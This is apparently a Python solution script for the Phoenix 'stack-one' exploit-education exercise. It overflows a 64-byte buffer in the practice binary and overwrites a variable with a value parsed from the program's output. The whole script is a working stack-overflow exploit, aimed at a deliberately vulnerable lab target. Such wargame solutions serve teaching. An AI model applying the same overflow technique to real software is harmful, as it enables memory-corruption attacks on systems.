from subprocess import Popen, PIPE
import re


FILE_PATH = "/opt/phoenix/i486/stack-one"


payload = "A" * 65
p = Popen([FILE_PATH, payload], stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.stdout.read().decode()
p.kill()

value = re.findall(r"we want (0x\w+)", reply)[0]
value = value.lstrip("0x")
value = bytearray.fromhex(value).decode()[::-1]

payload = "A" * 64 + value

p = Popen([FILE_PATH, payload], stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.stdout.read().decode()
assert "Well done, you have successfully set changeme to the correct value" in reply
print("Success!")




